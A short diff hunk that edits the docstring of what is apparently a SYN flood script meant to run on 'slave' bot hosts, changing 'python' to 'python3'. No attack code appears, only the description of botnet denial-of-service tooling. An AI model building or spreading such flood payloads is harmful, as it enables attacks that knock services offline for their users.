@@ -2,7 +2,7 @@
 '''
 This payload is supposed to be executed on "slave" hosts.
 
-Simple SYN flood script, using only packages from python standard library.
+Simple SYN flood script, using only packages from python3 standard library.
 Doing it with scapy would be easier but the target bots would need to have the package installed.
 '''
 
